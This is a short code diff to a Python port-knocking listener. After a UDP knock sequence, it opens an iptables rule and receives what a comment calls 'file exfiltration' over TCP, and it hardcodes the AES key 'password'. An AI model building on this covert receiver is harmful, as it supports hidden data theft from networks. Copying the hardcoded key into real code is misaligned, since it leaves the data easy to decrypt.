@@ -4,11 +4,13 @@ from IptableManager import IptableManager
 from dcaes import AESCipher
 
 class KnockListener(object):
-    def __init__(self):
+    def __init__(self, knock_port, time_to_live):
         self.port_list = [8000, 9000, 7000]
         self.incoming_ips = {}
         self.iptable_manager = IptableManager()
         self.aes_cipher = AESCipher("password")
+        self.knock_port = knock_port
+        self.time_to_live = time_to_live
 
     def listen(self):
         sniff(filter='udp and ip', prn=self.handle_packets)
@@ -59,17 +61,15 @@ class KnockListener(object):
 
     def accept_connection(self, ip):
         # add an iptables rule to allow a connection from ip
-        i = "s"
+        self.iptable_manager.manage_port_rules("tcp", ip, str(self.knock_port), self.time_to_live, True)
 
-        self.iptable_manager.manage_port_rules("tcp", ip, "7004", 3, True)
-
-        # New thread to listen on socket and receive file transfer
+        # New socket to listen for file exfiltration
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
         host_ip = socket.gethostbyname(socket.gethostname())
 
-        tcp_socket.bind((host_ip, 7004))
+        tcp_socket.bind((host_ip, self.knock_port))
 
         # write encrypted data to a file
         tcp_socket.listen(1)
